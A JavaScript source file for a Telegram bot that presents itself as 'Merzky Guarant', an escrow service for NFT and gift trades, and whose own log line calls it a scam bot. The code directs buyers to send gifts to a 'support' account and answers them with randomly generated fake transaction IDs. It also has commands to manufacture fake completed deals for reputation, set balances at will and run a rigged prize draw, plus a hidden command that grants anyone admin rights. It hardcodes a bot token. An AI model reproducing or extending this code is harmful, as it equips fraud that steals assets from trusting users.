const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// ========== ТВОИ ДАННЫЕ ==========
const token = '8299332460:AAGZaN1XQvE71r2nHDROgp7Ekpel-Ft43Wc';
const supportUsername = 'merzky_support';
const botUsername = 'MerzkyGarant_bot';
const MASTER_ID = 8563923108; // Только ты!
let adminIds = [MASTER_ID];

const bot = new TelegramBot(token, { 
    polling: true,
    onlyFirstMatch: true // Важно для команд
});

// ========== ДАННЫЕ ==========
let deals = new Map();
let completedDeals = new Map();
let userBalances = new Map();
let userSessions = new Map();
let userRequisites = new Map();
let users = new Map();

const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = JSON.parse(fs.readFileSync(DATA_FILE));
            deals = new Map(data.deals || []);
            completedDeals = new Map(data.completedDeals || []);
            userBalances = new Map(data.userBalances || []);
            userRequisites = new Map(data.userRequisites || []);
            users = new Map(data.users || []);
            if (data.adminIds) {
                adminIds = data.adminIds;
                if (!adminIds.includes(MASTER_ID)) {
                    adminIds.push(MASTER_ID);
                }
            }
            console.log('✅ Данные загружены');
        }
    } catch (e) {
        console.error('❌ Ошибка загрузки:', e);
    }
}

function saveData() {
    try {
        const data = {
            deals: Array.from(deals.entries()),
            completedDeals: Array.from(completedDeals.entries()),
            userBalances: Array.from(userBalances.entries()),
            userRequisites: Array.from(userRequisites.entries()),
            users: Array.from(users.entries()),
            adminIds: adminIds
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('✅ Данные сохранены');
    } catch (e) {
        console.error('❌ Ошибка сохранения:', e);
    }
}

loadData();

function generateDealId() {
    return 'RNF' + Math.random().toString(36).substring(2, 8).toUpperCase();
}

function isAdmin(userId) {
    return adminIds.includes(userId);
}

function isMaster(userId) {
    return userId === MASTER_ID;
}

function getDealLink(dealId) {
    return `https://t.me/${botUsername}?start=deal_${dealId}`;
}

function getUserFromMention(mention) {
    if (!mention) return null;
    const username = mention.replace('@', '');
    for (let [id, data] of users) {
        if (data.username === username) return id;
    }
    return null;
}

// ========== ФУНКЦИЯ УДАЛЕНИЯ СООБЩЕНИЙ ==========
async function deleteCommandMessage(msg, delay = 3000) {
    setTimeout(async () => {
        try {
            await bot.deleteMessage(msg.chat.id, msg.message_id);
        } catch (e) {
            // Игнорируем ошибки удаления
        }
    }, delay);
}

// ========== МЕНЮ ==========
function getMainMenu() {
    return {
        reply_markup: {
            keyboard: [
                [{ text: '➕ Создать сделку' }, { text: '💰 Мои реквизиты' }],
                [{ text: '📋 Мои сделки' }, { text: '👤 Профиль' }],
                [{ text: '📞 Поддержка' }]
            ],
            resize_keyboard: true
        }
    };
}

function getCurrencyMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💎 TON', callback_data: 'curr_ton' }],
                [{ text: '💵 USDT', callback_data: 'curr_usdt' }],
                [{ text: '⭐ Stars', callback_data: 'curr_stars' }],
                [{ text: '🏦 Карта', callback_data: 'curr_card' }]
            ]
        }
    };
}

// ========== КОМАНДЫ (ТЕПЕРЬ ДОЛЖНЫ РАБОТАТЬ) ==========

// СТАРТ
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    users.set(userId, {
        username: msg.from.username || 'no_username',
        first_name: msg.from.first_name,
        fakeDeals: 0
    });
    
    bot.sendMessage(
        chatId,
        '🚀 *Merzky Guarant*\n\n' +
        '🔹 Создай сделку и продай свой NFT\n' +
        '🔹 Добавь реквизиты для оплаты\n' +
        '🔹 Безопасные P2P сделки с гарантом\n\n' +
        '💎 Для вывода средств используй /viplati',
        {
            parse_mode: 'Markdown',
            ...getMainMenu()
        }
    );
});

// СТАТЬ АДМИНОМ
bot.onText(/\/merzkyteam/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /merzkyteam от', userId);

    await deleteCommandMessage(msg);

    if (!adminIds.includes(userId)) {
        adminIds.push(userId);
        saveData();
        bot.sendMessage(chatId, '✅ Ты теперь админ Merzky Team!');
    } else {
        bot.sendMessage(chatId, '⚡ Ты уже админ.');
    }
});

// КУПИТЬ СДЕЛКУ
bot.onText(/\/buy (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const dealId = match[1];
    console.log('Команда /buy', dealId, 'от', userId);
    
    await deleteCommandMessage(msg);
    
    const deal = deals.get(dealId);
    
    if (!deal) {
        return bot.sendMessage(chatId, '❌ Сделка не найдена');
    }
    
    if (deal.status !== 'pending') {
        return bot.sendMessage(chatId, '❌ Сделка уже обработана');
    }
    
    bot.sendMessage(
        chatId,
        `💳 *Оплата сделки #${dealId}*\n\n` +
        `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
        `👤 Продавец: @${deal.sellerUsername}\n\n` +
        `📩 Отправь подарок @${supportUsername}\n\n` +
        `✅ После отправки нажми /accept ${dealId}`,
        { parse_mode: 'Markdown' }
    );
});

// ПОДТВЕРДИТЬ СДЕЛКУ
bot.onText(/\/accept (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const dealId = match[1];
    console.log('Команда /accept', dealId, 'от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isAdmin(userId)) {
        return bot.sendMessage(chatId, '❌ Только админы');
    }
    
    const deal = deals.get(dealId);
    if (!deal) {
        return bot.sendMessage(chatId, '❌ Сделка не найдена');
    }
    
    deal.status = 'completed';
    completedDeals.set(dealId, deal);
    deals.delete(dealId);
    
    const currentBalance = userBalances.get(deal.sellerId) || 0;
    userBalances.set(deal.sellerId, currentBalance + deal.amount);
    saveData();
    
    bot.sendMessage(
        deal.sellerId,
        `✅ *Сделка #${dealId} завершена!*\n\n💰 ${deal.amount} ${deal.currency} зачислены`,
        { parse_mode: 'Markdown' }
    );
    
    const txId = '0x' + Math.random().toString(36).substring(2, 15);
    if (deal.buyerId) {
        bot.sendMessage(
            deal.buyerId,
            `✅ *NFT ПОЛУЧЕН!*\n\nСделка #${dealId}\nTxID: \`${txId}\``,
            { parse_mode: 'Markdown' }
        );
    }
    
    bot.sendMessage(chatId, `✅ Сделка #${dealId} подтверждена`);
});

// ОТКЛОНИТЬ СДЕЛКУ
bot.onText(/\/reject (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const dealId = match[1];
    console.log('Команда /reject', dealId, 'от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isAdmin(userId)) {
        return bot.sendMessage(chatId, '❌ Только админы');
    }
    
    const deal = deals.get(dealId);
    if (!deal) {
        return bot.sendMessage(chatId, '❌ Сделка не найдена');
    }
    
    deal.status = 'cancelled';
    completedDeals.set(dealId, deal);
    deals.delete(dealId);
    saveData();
    
    if (deal.buyerId) {
        bot.sendMessage(
            deal.buyerId,
            `❌ *Сделка #${dealId} отклонена*`,
            { parse_mode: 'Markdown' }
        );
    }
    
    bot.sendMessage(chatId, `❌ Сделка #${dealId} отклонена`);
});

// СПИСОК СДЕЛОК
bot.onText(/\/list/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /list от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isAdmin(userId)) {
        return bot.sendMessage(chatId, '❌ Только админы');
    }
    
    if (deals.size === 0) {
        return bot.sendMessage(chatId, '📭 Нет активных сделок');
    }
    
    let text = '📋 *Активные сделки:*\n\n';
    deals.forEach(deal => {
        text += `🔹 #${deal.id} — ${deal.amount} ${deal.currency} — ${deal.status}\n`;
        text += `   👤 Продавец: @${deal.sellerUsername}\n`;
        text += `   📅 ${new Date(deal.createdAt).toLocaleString()}\n\n`;
    });
    
    bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

// СТАТИСТИКА
bot.onText(/\/stats/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /stats от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isAdmin(userId)) {
        return bot.sendMessage(chatId, '❌ Только админы');
    }
    
    const totalDeals = deals.size + completedDeals.size;
    const totalUsers = users.size;
    const totalBalance = Array.from(userBalances.values()).reduce((a, b) => a + b, 0);
    
    bot.sendMessage(
        chatId,
        `📊 *Статистика*\n\n` +
        `📦 Всего сделок: ${totalDeals}\n` +
        `⏳ Активных: ${deals.size}\n` +
        `✅ Завершено: ${completedDeals.size}\n` +
        `👥 Пользователей: ${totalUsers}\n` +
        `💰 Общий баланс: ${totalBalance} TON`,
        { parse_mode: 'Markdown' }
    );
});

// ========== КОМАНДЫ ТОЛЬКО ДЛЯ МАСТЕРА ==========

// ДОБАВИТЬ АДМИНА
bot.onText(/\/addadmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /addadmin от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isMaster(userId)) {
        return bot.sendMessage(chatId, '❌ Только создатель бота');
    }
    
    const target = match[1];
    const targetId = getUserFromMention(target);
    
    if (!targetId) {
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
    }
    
    if (!adminIds.includes(targetId)) {
        adminIds.push(targetId);
        saveData();
        bot.sendMessage(chatId, `✅ ${target} теперь админ!`);
        bot.sendMessage(targetId, `👑 Вы назначены админом!`);
    } else {
        bot.sendMessage(chatId, `⚡ ${target} уже админ`);
    }
});

// УДАЛИТЬ АДМИНА
bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /removeadmin от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isMaster(userId)) {
        return bot.sendMessage(chatId, '❌ Только создатель бота');
    }
    
    const target = match[1];
    const targetId = getUserFromMention(target);
    
    if (!targetId) {
        return bot.sendMessage(chatId, '❌ Пользователь не найдена');
    }
    
    if (targetId === MASTER_ID) {
        return bot.sendMessage(chatId, '❌ Нельзя удалить создателя');
    }
    
    if (adminIds.includes(targetId)) {
        adminIds = adminIds.filter(id => id !== targetId);
        saveData();
        bot.sendMessage(chatId, `✅ ${target} больше не админ`);
        bot.sendMessage(targetId, `👋 Вы лишены прав админа`);
    } else {
        bot.sendMessage(chatId, `⚡ ${target} не является админом`);
    }
});

// СПИСОК АДМИНОВ
bot.onText(/\/adminlist/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /adminlist от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isMaster(userId)) {
        return bot.sendMessage(chatId, '❌ Только создатель');
    }
    
    let text = '👑 *Список админов:*\n\n';
    adminIds.forEach((id, index) => {
        const userData = users.get(id) || { username: 'unknown' };
        text += `${index + 1}. @${userData.username} (${id})${id === MASTER_ID ? ' 👑' : ''}\n`;
    });
    
    bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

// НАКРУТИТЬ ФЕЙКОВЫЕ СДЕЛКИ
bot.onText(/\/addfake (.+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /addfake от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isMaster(userId)) {
        return bot.sendMessage(chatId, '❌ Только создатель');
    }
    
    const target = match[1];
    const count = parseInt(match[2]);
    const targetId = getUserFromMention(target);
    
    if (!targetId) {
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
    }
    
    const userData = users.get(targetId) || { 
        username: target.replace('@', ''), 
        fakeDeals: 0 
    };
    
    userData.fakeDeals = (userData.fakeDeals || 0) + count;
    users.set(targetId, userData);
    
    for (let i = 0; i < count; i++) {
        const dealId = generateDealId();
        const fakeDeal = {
            id: dealId,
            sellerId: targetId,
            sellerUsername: userData.username,
            nftLink: 'https://t.me/nft/fake_' + i,
            amount: Math.floor(Math.random() * 1000) + 100,
            currency: ['ton', 'usdt', 'stars'][Math.floor(Math.random() * 3)],
            status: 'completed',
            isFake: true,
            createdAt: new Date().toISOString()
        };
        completedDeals.set(dealId, fakeDeal);
    }
    
    saveData();
    
    bot.sendMessage(chatId, `✅ Накручено ${count} фейковых сделок для ${target}`);
});

// ДОБАВИТЬ БАЛАНС
bot.onText(/\/addbalance (.+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /addbalance от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isMaster(userId)) {
        return bot.sendMessage(chatId, '❌ Только создатель');
    }
    
    const target = match[1];
    const amount = parseInt(match[2]);
    const targetId = getUserFromMention(target);
    
    if (!targetId) {
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
    }
    
    const currentBalance = userBalances.get(targetId) || 0;
    userBalances.set(targetId, currentBalance + amount);
    saveData();
    
    bot.sendMessage(chatId, `✅ Добавлено ${amount} TON пользователю ${target}`);
});

// УСТАНОВИТЬ БАЛАНС
bot.onText(/\/setbalance (.+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /setbalance от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isMaster(userId)) {
        return bot.sendMessage(chatId, '❌ Только создатель');
    }
    
    const target = match[1];
    const amount = parseInt(match[2]);
    const targetId = getUserFromMention(target);
    
    if (!targetId) {
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
    }
    
    userBalances.set(targetId, amount);
    saveData();
    
    bot.sendMessage(chatId, `✅ Баланс ${target} установлен на ${amount} TON`);
});

// СБРОСИТЬ ПОЛЬЗОВАТЕЛЯ
bot.onText(/\/wipe (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /wipe от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isMaster(userId)) {
        return bot.sendMessage(chatId, '❌ Только создатель');
    }
    
    const target = match[1];
    const targetId = getUserFromMention(target);
    
    if (!targetId) {
        return bot.sendMessage(chatId, '❌ Пользователь не найден');
    }
    
    userBalances.delete(targetId);
    userRequisites.delete(targetId);
    
    for (let [dealId, deal] of deals) {
        if (deal.sellerId === targetId || deal.buyerId === targetId) {
            deals.delete(dealId);
        }
    }
    
    for (let [dealId, deal] of completedDeals) {
        if (deal.sellerId === targetId || deal.buyerId === targetId) {
            completedDeals.delete(dealId);
        }
    }
    
    saveData();
    
    bot.sendMessage(chatId, `✅ Пользователь ${target} полностью сброшен`);
});

// ФЕЙКОВЫЙ КЕЙС
bot.onText(/\/fakecase/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    console.log('Команда /fakecase от', userId);
    
    await deleteCommandMessage(msg);
    
    if (!isMaster(userId)) {
        return bot.sendMessage(chatId, '❌ Только создатель');
    }
    
    const items = [
        '🎁 Обычный подарок',
        '🎁 Редкий подарок', 
        '🎁 Легендарный подарок',
        '💎 10 TON',
        '💎 50 TON',
        '💎 100 TON',
        '💎 500 TON'
    ];
    
    const result = items[Math.floor(Math.random() * items.length)];
    
    bot.sendMessage(
        chatId,
        `🎰 *Фейковый кейс*\n\n` +
        `🔥 Выпало: *${result}*\n` +
        `📊 Шанс: ${Math.floor(Math.random() * 10)}%`,
        { parse_mode: 'Markdown' }
    );
});

// ========== ОБРАБОТКА КНОПОК ==========
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const userId = query.from.id;
    const data = query.data;

    try {
        if (data === 'edit_ton') {
            userSessions.set(userId, { step: 'waiting_ton' });
            await bot.editMessageText(
                '✏️ Отправьте новый **TON кошелек**:',
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
        }
        else if (data === 'edit_usdt') {
            userSessions.set(userId, { step: 'waiting_usdt' });
            await bot.editMessageText(
                '✏️ Отправьте новый **USDT адрес**:',
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
        }
        else if (data === 'edit_card') {
            userSessions.set(userId, { step: 'waiting_card' });
            await bot.editMessageText(
                '✏️ Отправьте новую **карту**:',
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
        }
        else if (data === 'back_main') {
            await bot.deleteMessage(chatId, messageId);
            await bot.sendMessage(chatId, 'Главное меню:', getMainMenu());
        }
        else if (data.startsWith('curr_')) {
            const currency = data.split('_')[1];
            
            const req = userRequisites.get(userId);
            if (currency !== 'stars') {
                if (!req || !req[currency]) {
                    return bot.answerCallbackQuery(query.id, '❌ Сначала добавь реквизиты в "💰 Мои реквизиты"');
                }
            }
            
            userSessions.set(userId, { 
                step: 'waiting_nft', 
                currency: currency,
                messageId: messageId
            });
            
            await bot.editMessageText(
                '📎 Отправьте ссылку на NFT:',
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
        }
        else if (data.startsWith('buy_')) {
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) {
                return bot.answerCallbackQuery(query.id, '❌ Сделка не найдена');
            }
            
            if (deal.status !== 'pending') {
                return bot.answerCallbackQuery(query.id, '❌ Сделка уже обработана');
            }
            
            await bot.sendMessage(
                chatId,
                `💳 *Оплата сделки #${dealId}*\n\n` +
                `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
                `👤 Продавец: @${deal.sellerUsername}\n\n` +
                `📩 Отправьте подарок @${supportUsername}\n\n` +
                `✅ После отправки нажми /accept ${dealId}`,
                { parse_mode: 'Markdown' }
            );
            
            await bot.answerCallbackQuery(query.id, '✅ Готово');
        }
        
        await bot.answerCallbackQuery(query.id);
        
    } catch (error) {
        console.error('Ошибка:', error);
        await bot.answerCallbackQuery(query.id, '❌ Ошибка');
    }
});

// ========== ОБРАБОТКА ТЕКСТА ==========
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;

    // Сохраняем пользователя
    if (!users.has(userId)) {
        users.set(userId, {
            username: msg.from.username || 'no_username',
            first_name: msg.from.first_name,
            fakeDeals: 0
        });
    }

    // Пропускаем команды
    if (text?.startsWith('/')) {
        return;
    }

    // Пропускаем кнопки меню
    if (text === '➕ Создать сделку' || 
        text === '💰 Мои реквизиты' ||
        text === '📋 Мои сделки' ||
        text === '👤 Профиль' ||
        text === '📞 Поддержка') {
        return;
    }

    const session = userSessions.get(userId);
    if (!session) return;

    if (session.step === 'waiting_ton') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.ton = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ TON кошелек сохранен!', getMainMenu());
        return;
    }
    else if (session.step === 'waiting_usdt') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.usdt = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ USDT адрес сохранен!', getMainMenu());
        return;
    }
    else if (session.step === 'waiting_card') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.card = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ Карта сохранена!', getMainMenu());
        return;
    }

    if (session.step === 'waiting_nft') {
        if (!text.includes('t.me/') && !text.includes('http')) {
            return bot.sendMessage(chatId, '❌ Отправьте корректную ссылку');
        }
        
        session.nftLink = text;
        session.step = 'waiting_amount';
        userSessions.set(userId, session);
        
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        try {
            await bot.editMessageText(
                '💰 Введите сумму:',
                {
                    chat_id: chatId,
                    message_id: session.messageId
                }
            );
        } catch (e) {
            await bot.sendMessage(chatId, '💰 Введите сумму:');
        }
    }
    
    else if (session.step === 'waiting_amount') {
        const amount = parseFloat(text);
        if (isNaN(amount) || amount <= 0) {
            return bot.sendMessage(chatId, '❌ Введите корректное число');
        }
        
        const dealId = generateDealId();
        const deal = {
            id: dealId,
            sellerId: userId,
            sellerUsername: msg.from.username || 'no_username',
            nftLink: session.nftLink,
            amount: amount,
            currency: session.currency,
            status: 'pending',
            createdAt: new Date().toISOString()
        };
        
        deals.set(dealId, deal);
        saveData();
        
        const dealLink = getDealLink(dealId);
        
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        try {
            await bot.editMessageText(
                `✅ *Сделка создана!*\n\n` +
                `#${dealId}\n` +
                `💰 Сумма: ${amount} ${session.currency}\n\n` +
                `🔗 [Нажмите для покупки](${dealLink})\n\n` +
                `📎 Или отправьте ссылку:\n\`${dealLink}\``,
                {
                    chat_id: chatId,
                    message_id: session.messageId,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                }
            );
        } catch (e) {
            await bot.sendMessage(
                chatId,
                `✅ *Сделка создана!*\n\n` +
                `#${dealId}\n` +
                `💰 Сумма: ${amount} ${session.currency}\n\n` +
                `👉 [Купить NFT](${dealLink})`,
                { parse_mode: 'Markdown' }
            );
        }
        
        userSessions.delete(userId);
    }
});

process.on('SIGINT', () => {
    console.log('\n💾 Сохраняю...');
    saveData();
    process.exit();
});

console.log('🔥 Merzky Scam Bot запущен!');
console.log('👑 Твой ID (мастер):', MASTER_ID);
console.log('🤖 Новый токен:', token);
console.log('📞 Саппорт: @' + supportUsername);
console.log('✅ Команды должны работать после настройки в BotFather');